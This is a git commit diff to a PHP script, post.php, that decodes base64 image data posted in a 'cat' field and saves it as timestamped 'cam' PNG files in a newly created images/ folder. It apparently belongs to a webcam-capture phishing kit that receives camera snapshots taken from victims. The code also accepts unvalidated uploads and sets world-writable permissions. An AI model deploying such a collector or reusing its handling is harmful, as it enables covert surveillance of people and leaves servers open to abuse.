b263b5854626b4272e2b3c0c746048ed948e2380
TissuGalon <parzivalxdd@gmail.com>
2024-12-11 03:35:34 +0700

    update_path_simpan_foto

--- post.php
+++ post.php
@@ -5,15 +5,21 @@ $imageData = $_POST['cat'];
 
 if (!empty($_POST['cat'])) {
     error_log("Received" . "\r\n", 3, "Log.log");
-
 }
 
 $filteredData = substr($imageData, strpos($imageData, ",") + 1);
 $unencodedData = base64_decode($filteredData);
-$fp = fopen('cam' . $date . '.png', 'wb');
+
+
+$folderPath = 'images/';
+if (!is_dir($folderPath)) {
+    mkdir($folderPath, 0777, true);
+}
+
+$filePath = $folderPath . 'cam' . $date . '.png';
+$fp = fopen($filePath, 'wb');
 fwrite($fp, $unencodedData);
 fclose($fp);
 
 exit();
 ?>
-
